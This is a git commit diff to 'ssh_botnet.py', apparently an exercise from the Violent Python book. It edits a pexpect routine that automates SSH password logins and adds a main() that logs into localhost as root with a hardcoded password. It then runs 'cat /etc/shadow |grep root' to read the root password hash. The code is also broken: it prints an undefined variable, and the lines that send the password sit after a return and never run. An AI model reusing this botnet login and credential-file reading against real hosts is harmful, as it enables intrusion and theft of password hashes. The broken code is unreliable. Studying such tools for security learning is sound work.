086c2272593b7111080b114fd53f6a693d1a3df3
root <root@localhost.localdomain>
2019-04-07 18:50:29 -0400

    update

--- violent python/ssh_botnet.py
+++ violent python/ssh_botnet.py
@@ -11,17 +11,26 @@ def connect(user, host, password):
     ssh_newkey = 'Are you sure you want to continue connecting'
     connStr = 'ssh '+user+'@'+host
     child = pexpect.spawn(connStr)
-    ret = child.expect([pexpect.TIMEOUT, ssh_newkey,\'[P|p]assword:'])
+    ret = child.expect([pexpect.TIMEOUT, ssh_newkey,'[P|p]assword:'])
     if ret == 0:
         print '[-] Error Error Error connecting!'
         return
     if ret == 1:
         child.sendline('yes')
-    ret =  child.expect([pexpect.TIMEOUT,\'[P|p]assword:'])
+    ret =  child.expect([pexpect.TIMEOUT,'[P|p]assword:'])
     if ret == 0:
         print '[-] Error Error Error connecting!'
-            return
+        return
         child.sendline(password)
         child.expect(PROMPT)
         return child
         
+def main():
+    host = 'localhost'
+    user = 'root'
+    password = 'Etrrgogr5'
+    child = connect(user, host, password)
+    print ret
+    send_command(child, 'cat /etc/shadow |grep root')
+if __name__ == '__main__':
+    main()
